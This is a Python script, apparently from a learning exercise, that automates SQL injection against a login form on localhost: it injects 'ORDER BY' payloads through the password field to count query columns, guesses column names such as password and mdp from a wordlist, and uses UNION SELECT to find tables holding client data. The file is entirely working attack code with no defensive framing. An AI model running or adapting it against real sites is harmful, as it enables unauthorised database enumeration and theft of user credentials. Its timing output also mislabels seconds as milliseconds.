import requests
import time
start = time.time()
# First part of the script for find how many there are champs in the request
formulaire = requests.Session() # Allows to generate a session under the name of 'form' variable
url_local = "http://localhost/main.php"
response_html = formulaire.get(url=url_local)
resultat_html = response_html.text
j = 0
for i in range(0, 10):
    champ_mdp = f"'ORDER BY {str(i)}#"
    champ_identif = ''
    send_sql = ({"identif":champ_identif, "mdp":champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    if (response.text.find("Erreur") == -1):
        j = i + 1
        break
print(f"Le nombre de champs dans la requête est de {j}")
# ---------------------------------------------------------------------------
# Second parts of the script for find the names of the champs in the request
list_names = []
for nom in ('identif', 'id', 'identifiant', 'numero', 'nom', 'prenom', 'pass', 'passwd', 'password', 'motdepasse',
            'mdp', 'user', 'username', 'utilsateurs', 'utilisateur', 'mot de passe', 'name', 'nickname',
            'lastname', 'firstname'):
    champ_mdp = f"'ORDER BY {nom}#"
    champ_identif = ''
    send_sql = ({"identif": champ_identif, "mdp": champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    if (response.text.find("Erreur") == -1):
        list_names.append(nom)
print(f"The list of the champs of the database are : {list_names}")
# ---------------------------------------------------------------------------
# Third parts of the script for find the name of the table which is using in the database
liste_tables = []
for nom in ('users', 'user', 'identifiant', 'utilisateurs', 'utilisateur', 'client',
            'login', 'log', 'clients'):
    champ_mdp = f"'UNION SELECT nom, prenom FROM {nom}#"
    champ_identif = ''
    send_sql = ({"identif": champ_identif, "mdp": champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    if (response.text.find("Erreur") == -1):
        liste_tables.append(nom)
        break
print(f"The names of the tables who contain informations on client are : {liste_tables}")
end = time.time()
difference = end - start
print(f'Execution time : {difference:2}ms\n')